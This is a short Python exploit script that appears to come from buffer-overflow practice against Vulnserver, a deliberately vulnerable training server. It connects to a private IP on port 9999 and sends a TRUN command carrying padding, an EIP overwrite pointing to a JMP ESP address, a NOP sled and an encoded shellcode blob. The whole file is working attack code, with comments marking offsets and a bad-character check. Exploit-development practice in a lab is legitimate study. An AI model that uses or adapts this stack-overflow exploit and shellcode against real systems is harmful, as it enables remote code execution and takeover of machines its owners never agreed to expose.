#!/usr/bin/python

# 28/01/2022
# START FROM 0x00D7F234
# END 0x00D7FDDC
# 2984 TOTAL

# 0x62501203 JMP ESP 

import socket
import struct 

# check bad character 
# all_char = b"".join([ struct.pack('<B',x) for x in range(1,256)])

s = socket.socket()
s.connect(("192.168.0.187", 9999)) # TARGET IP / DEFAULT PORT FOR VULNSERVER

total_length = 2984
offset = 2003
new_eip = struct.pack("<I", 0x62501203) # jmp esp

nop_sled = b"\x90" * 16

buf =  b""
buf += b"\xbd\xae\xb2\xc6\x88\xd9\xc7\xd9\x74\x24\xf4\x58\x2b"
buf += b"\xc9\xb1\x59\x83\xe8\xfc\x31\x68\x10\x03\x68\x10\x4c"
buf += b"\x47\x3a\x60\x1f\xa8\xc3\x71\x7f\x98\x11\xf8\x9a\xbe"
buf += b"\x1e\xa9\x54\xb4\x73\x42\x1f\x98\x67\x55\xa8\x57\xae"
buf += b"\x58\x29\xec\xdc\xb2\xe4\x33\x8c\xff\x67\xc8\xcf\xd3"
buf += b"\x47\xf1\x1f\x26\x86\x36\xd6\x4c\x67\xea\xbe\x25\x25"
buf += b"\x1b\xca\x78\xf5\x1a\x1c\xf7\x45\x65\x19\xc8\x31\xd9"
buf += b"\x20\x19\x32\xa9\x3a\xc9\xcf\x72\x1b\xe8\x1c\x07\x92"
buf += b"\x9e\x9e\x41\x14\xa0\x55\x65\xdd\x5f\xbf\xb7\x21\xf3"
buf += b"\xfe\x77\xac\x0d\xc7\xb0\x4f\x78\x33\xc3\xf2\x7b\x80"
buf += b"\xb9\x28\x09\x16\x19\xba\xa9\xf2\x9b\x6f\x2f\x71\x97"
buf += b"\xc4\x3b\xdd\xb4\xdb\xe8\x56\xc0\x50\x0f\xb8\x40\x22"
buf += b"\x34\x1c\x08\xf0\x55\x05\xf4\x57\x69\x55\x50\x07\xcf"
buf += b"\x1e\x73\x5e\x6f\xdf\x8b\x5f\x2d\x77\x47\x92\xce\x87"
buf += b"\xcf\xa5\xbd\xb5\x50\x1e\x2a\xf5\x19\xb8\xad\x8c\x0e"
buf += b"\x3b\x61\x36\x5e\xc5\x82\x46\x76\x02\xd6\x16\xe0\xa3"
buf += b"\x57\xfd\xf0\x4c\x82\x6b\xfb\xda\xed\xc3\xfb\x75\x86"
buf += b"\x11\xfc\x98\x0a\x9c\x1a\xca\xe2\xce\xb2\xab\x52\xae"
buf += b"\x62\x44\xb9\x21\x5c\x74\xc2\xe8\xf5\x1f\x2d\x44\xad"
buf += b"\xb7\xd4\xcd\x25\x29\x18\xd8\x43\x69\x92\xe8\xb4\x24"
buf += b"\x53\x99\xa6\x51\x04\x61\x37\xa2\xa1\x61\x5d\xa6\x63"
buf += b"\x36\xc9\xa4\x52\x70\x56\x56\xb1\x03\x91\xa8\x44\x35"
buf += b"\xe9\x9f\xd2\x79\x85\xdf\x32\x79\x55\xb6\x58\x79\x3d"
buf += b"\x6e\x39\x2a\x58\x71\x94\x5f\xf1\xe4\x17\x09\xa5\xaf"
buf += b"\x7f\xb7\x90\x98\xdf\x48\xf7\x9a\x18\xb6\x85\xb4\x80"
buf += b"\xde\x75\x85\x30\x1e\x1c\x05\x61\x76\xeb\x2a\x8e\xb6"
buf += b"\x14\xe1\xc7\xde\x9f\x64\xa5\x7f\x9f\xac\x6b\x21\xa0"
buf += b"\x43\xb0\xd2\xdb\x2c\x47\x13\x1c\x25\x2c\x14\x1c\x49"
buf += b"\x52\x29\xca\x70\x20\x6c\xce\xc6\x3b\xdb\x73\x6e\xd6"
buf += b"\x23\x27\x70\xf3"

shellcode = buf

payload = [
    b"TRUN /.:/",
    b"A"* offset,
    new_eip,
    # all_char,
    nop_sled,
    shellcode,
    b"C"*(total_length - offset - len(new_eip) - len(nop_sled) - len(shellcode)) # - len(all_char)
]
payload = b"".join(payload)

s.send(payload)

s.close()